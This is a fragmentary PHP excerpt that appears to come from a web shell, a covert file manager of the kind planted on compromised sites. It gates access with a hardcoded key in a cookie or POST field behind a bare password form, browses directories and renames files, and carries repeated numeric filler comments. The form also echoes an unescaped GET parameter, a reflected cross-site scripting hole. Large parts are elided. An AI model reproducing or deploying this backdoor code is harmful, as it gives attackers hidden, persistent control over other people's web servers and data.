...
$auth_key = "ab98ca44136ab5c32618802eb15f0b30";
...
$pass = false;
if (isset($_COOKIE['pw_name_88059'])) {
    if(($_COOKIE['pw_name_88059']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_88059'])) {
        if(($_POST['pw_name_88059']) == $auth_key) {
            setcookie("pw_name_88059", $_POST['pw_name_88059']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_88059' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724682773620798 1724682773403996 1724682773922452 1724682773629920
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724682773620798 1724682773403996 1724682773922452 1724682773629920
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724682773620798 1724682773403996 1724682773922452 1724682773629920
            $name = PATH . "/" . $_GET['r'];
